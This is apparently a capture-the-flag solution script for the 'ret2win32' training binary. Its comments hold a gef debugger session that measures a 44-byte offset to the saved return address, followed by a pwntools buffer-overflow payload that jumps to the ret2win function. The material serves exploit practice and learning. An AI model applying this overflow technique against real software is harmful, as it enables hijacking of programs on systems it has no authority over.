# coding: utf-8

# gef➤  disass pwnme
# Dump of assembler code for function pwnme:
#    <...>
#    0x0804860f <+98>:	push   0x0
#    0x08048611 <+100>:	call   0x80483b0 <read@plt>
#    0x08048616 <+105>:	add    esp,0x10
#    0x08048619 <+108>:	sub    esp,0xc
#    0x0804861c <+111>:	push   0x80487eb
#    0x08048621 <+116>:	call   0x80483d0 <puts@plt>
#    0x08048626 <+121>:	add    esp,0x10
#    <...>
# End of assembler dump.
# 
# gef➤  break *pwnme+121
# Breakpoint 1 at 0x8048626
# 
# gef➤  run
# <...>
# Thank you!
# 
# Breakpoint 1, 0x08048626 in pwnme ()
# <...>
# ───────────────────────────────────────────────────────────────────── stack ────
# 0xffffd1b0│+0x0000: 0x080487eb  →  "Thank you!"	 ← $esp
# 0xffffd1b4│+0x0004: 0xffffd1c0  →  "AAAAAAAAAAAA\n"
# 0xffffd1b8│+0x0008: 0x00000038 ("8"?)
# 0xffffd1bc│+0x000c: 0x00000004
# 0xffffd1c0│+0x0010: "AAAAAAAAAAAA\n"
# 0xffffd1c4│+0x0014: "AAAAAAAA\n"
# 0xffffd1c8│+0x0018: "AAAA\n"
# 0xffffd1cc│+0x001c: 0x0000000a
# 
# [!] ESP is at 0xffffd1c0.
# 
# gef➤  info frame
# Stack level 0, frame at 0xffffd1f0:
#  eip = 0x8048626 in pwnme; saved eip = 0x8048590
#  called by frame at 0xffffd210
#  Arglist at 0xffffd1e8, args:
#  Locals at 0xffffd1e8, Previous frame's sp is 0xffffd1f0
#  Saved registers:
#   ebp at 0xffffd1e8, eip at 0xffffd1ec
# 
# [!] EIP is at 0xffffd1ec.
# 
# gef➤  p/d 0xffffd1ec - 0xffffd1c0
# $1 = 44
# 
# [!] Size of area to overwrite is 44.
# 
# gef➤  p ret2win
# $2 = {<text variable, no debug info>} 0x804862c <ret2win>
# 
# [!] `ret2win` function is at 0x804862c.

from pwn import *
context(os="Linux", arch="i386")

p = process("./ret2win32")
p.recvuntil("> ")
p.sendline("\x41" * 44 + "\x2c\x86\x04\x08")
print(p.recvall())
